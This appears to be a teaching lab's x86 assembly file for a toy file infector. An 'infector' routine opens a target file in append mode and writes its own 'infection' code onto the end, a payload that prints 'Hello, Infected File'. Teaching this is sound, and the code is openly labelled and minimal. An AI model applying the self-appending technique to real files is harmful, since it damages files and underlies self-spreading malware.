section	.rodata			; we define (global) read-only variables in .rodata section
	format_string: db "Hello, Infected File", 10	; format string
section .text
global _start
global system_call
extern main

global code_start
global code_end
global infection
global infector
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, 4          ; SYS_WRITE 
    mov     ebx, 1          ; STD OUT
    mov     ecx, format_string   
    mov     edx, 21   ; the string length
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
code_end:

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    ;now we open the file
    mov     eax,5           ; SYS_OPEN
    mov     ebx, [ebp+8]    ;file name
    mov     ecx, 1026       ;1026= 2|1024 wich means O_RDRW | O_APPENT
    mov     edx, 0777
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    ; write into the end of the file
    mov     eax, 4          ; SYS_WRITE 
    mov     ebx,[ebp-4]     ; our file
    mov     ecx, code_start
    mov     edx,(code_end-code_start)
    int     0x80            ; Transfer control to operating system
    ; closing the file
    mov     eax, 6          ; SYS_CLOSE
    mov     ebx,[ebp-4]     ; our file
    mov     ecx,0
    mov     edx,0
    int     0x80            ; Transfer control to operating system
    ; Restore caller state
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller